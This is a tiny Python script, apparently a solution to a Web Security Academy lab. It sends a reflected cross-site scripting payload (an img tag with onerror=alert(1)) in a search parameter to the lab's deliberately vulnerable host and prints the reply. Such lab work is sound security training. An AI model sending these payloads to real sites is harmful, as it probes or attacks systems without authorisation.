import requests

url = "https://0a170041042868ffc0fb223b00a5006a.web-security-academy.net/?search=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E"

solution = requests.get(url)

print(solution.content)